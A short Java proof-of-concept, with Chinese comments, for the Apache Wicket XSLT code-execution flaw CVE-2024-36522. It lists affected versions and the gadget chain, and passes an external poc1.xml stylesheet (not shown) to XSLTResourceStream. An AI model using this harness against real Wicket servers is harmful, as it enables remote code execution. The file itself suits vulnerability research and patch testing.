
/*
Apache Wicket XSLT 代码执行漏洞 CVE-2024-36522
*/
/*影响版本
* 10.0.0-M1 <= Apache Wicket <= 10.0.0
* 9.0.0 <= Apache Wicket <= 9.17.0
* 8.0.0 <= Apache Wicket <= 8.15.0
* */

import org.apache.wicket.util.resource.FileResourceStream;
import org.apache.wicket.util.resource.IResourceStream;
import org.apache.wicket.util.resource.XSLTResourceStream;
import java.io.File;


/*
* 构造链:
*   XSLTResourceStream.XSLTResourceStream()
*       TransformerFactoryImpl.transform()
*           AbstractTranslet.transform()
*
*
* */
public class Wicket2 {
    public static void main(String[] args) {
        IResourceStream xstlStream=new FileResourceStream(new File("Wicket2/src/main/java/poc1.xml"));
        IResourceStream xmlStream=new FileResourceStream(new File("Wicket2/src/main/java/poc1.xml"));
        XSLTResourceStream stream = new XSLTResourceStream(xstlStream,xmlStream);
    }
}
